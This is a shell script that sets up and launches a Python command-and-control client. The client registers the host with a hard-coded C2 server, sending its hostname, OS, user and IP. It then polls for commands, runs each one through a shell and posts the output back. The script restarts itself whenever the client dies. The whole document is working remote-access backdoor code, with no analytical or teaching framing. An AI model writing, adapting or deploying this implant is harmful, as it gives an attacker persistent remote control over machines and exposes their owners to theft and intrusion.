#!/bin/sh
"""
Auto-deploy C2 Client Startup Script
Automatically connects endpoint to C2 server on startup
"""

# Configuration
C2_HOST="${C2_HOST:-192.168.210.170}"
C2_PORT="${C2_PORT:-8080}"
CLIENT_ID="$(hostname)-$$"

# Colors for logging
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() {
    echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $1"
}

success() {
    echo -e "${GREEN}[+]${NC} $1"
}

error() {
    echo -e "${RED}[-]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Wait for C2 server to be ready
wait_for_c2() {
    local timeout=60
    local count=0
    
    log "Waiting for C2 server at ${C2_HOST}:${C2_PORT}..."
    
    while [ $count -lt $timeout ]; do
        if wget -q --spider "http://${C2_HOST}:${C2_PORT}/health" 2>/dev/null; then
            success "C2 server is ready"
            return 0
        fi
        
        sleep 2
        count=$((count + 1))
        
        if [ $((count % 15)) -eq 0 ]; then
            warn "Still waiting for C2 server... (${count}s)"
        fi
    done
    
    error "C2 server not available after ${timeout} seconds"
    return 1
}

# Install Python client dependencies
setup_environment() {
    log "Setting up client environment..."
    
    # Install required packages
    apk add --no-cache python3 py3-pip curl wget > /dev/null 2>&1
    
    # Create client directory
    mkdir -p /opt/c2client
    cd /opt/c2client
    
    success "Environment ready"
}

# Create embedded light client
create_client() {
    log "Creating C2 client..."
    
    cat > /opt/c2client/client.py << 'EOF'
#!/usr/bin/env python3
import urllib.request
import json
import subprocess
import time
import platform
import os
import sys
import socket

class AutoC2Client:
    def __init__(self, c2_host="192.168.210.170", c2_port="8080"):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.client_id = f"{platform.node()}-{os.getpid()}"
        self.c2_url = f"http://{c2_host}:{c2_port}"
        self.running = True
        
    def log(self, msg):
        print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def execute(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Command timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def register(self):
        try:
            data = {
                "client_id": self.client_id,
                "hostname": platform.node(),
                "os": platform.system(),
                "arch": platform.machine(),
                "user": os.getenv("USER", "root"),
                "pwd": os.getcwd(),
                "local_ip": self.get_local_ip(),
                "container": os.getenv("HOSTNAME", platform.node()),
                "auto_deployed": True
            }
            
            req = urllib.request.Request(
                f"{self.c2_url}/api/register",
                json.dumps(data).encode(),
                {"Content-Type": "application/json"}
            )
            urllib.request.urlopen(req, timeout=10)
            self.log(f"✓ Registered as {self.client_id}")
            return True
        except Exception as e:
            self.log(f"✗ Registration failed: {e}")
            return False
    
    def check_commands(self):
        try:
            req = urllib.request.Request(f"{self.c2_url}/api/clients/{self.client_id}")
            resp = urllib.request.urlopen(req, timeout=10)
            data = json.loads(resp.read().decode())
            
            if data.get("commands"):
                for cmd_data in data["commands"]:
                    self.log(f"→ Executing: {cmd_data['command']}")
                    result = self.execute(cmd_data["command"])
                    
                    result_req = urllib.request.Request(
                        f"{self.c2_url}/api/results",
                        json.dumps({
                            "client_id": self.client_id,
                            "command_id": cmd_data["id"],
                            "result": result
                        }).encode(),
                        {"Content-Type": "application/json"}
                    )
                    urllib.request.urlopen(result_req, timeout=10)
                    self.log(f"← Result sent")
        except:
            pass
    
    def run(self):
        self.log(f"🚀 Auto C2 Client starting: {self.client_id}")
        self.log(f"🎯 Target C2: {self.c2_url}")
        
        # Register with retries
        for attempt in range(5):
            if self.register():
                break
            time.sleep(5 + attempt * 2)
        
        self.log("📡 Client active - awaiting commands...")
        
        while self.running:
            try:
                self.check_commands()
                time.sleep(5)
            except KeyboardInterrupt:
                self.log("🛑 Client stopping...")
                break
            except:
                time.sleep(10)

if __name__ == "__main__":
    c2_host = sys.argv[1] if len(sys.argv) > 1 else os.getenv("C2_HOST", "192.168.210.170")
    c2_port = sys.argv[2] if len(sys.argv) > 2 else os.getenv("C2_PORT", "8080")
    
    client = AutoC2Client(c2_host, c2_port)
    client.run()
EOF

    chmod +x /opt/c2client/client.py
    success "Client created at /opt/c2client/client.py"
}

# Start the client
start_client() {
    log "Starting C2 client..."
    
    # Start client in background
    python3 /opt/c2client/client.py "${C2_HOST}" "${C2_PORT}" &
    CLIENT_PID=$!
    
    success "Client started with PID: ${CLIENT_PID}"
    
    # Keep container alive and monitor client
    while kill -0 $CLIENT_PID 2>/dev/null; do
        sleep 30
    done
    
    error "Client process died, restarting..."
    exec "$0" "$@"
}

# Main execution
main() {
    log "🔥 Auto-deploy C2 Client Startup"
    log "Client ID: ${CLIENT_ID}"
    log "Target: ${C2_HOST}:${C2_PORT}"
    
    setup_environment
    
    if ! wait_for_c2; then
        error "Cannot connect to C2 server, exiting"
        exit 1
    fi
    
    create_client
    start_client
}

# Handle signals
trap 'log "Received termination signal"; exit 0' TERM INT

# Run main function
main "$@"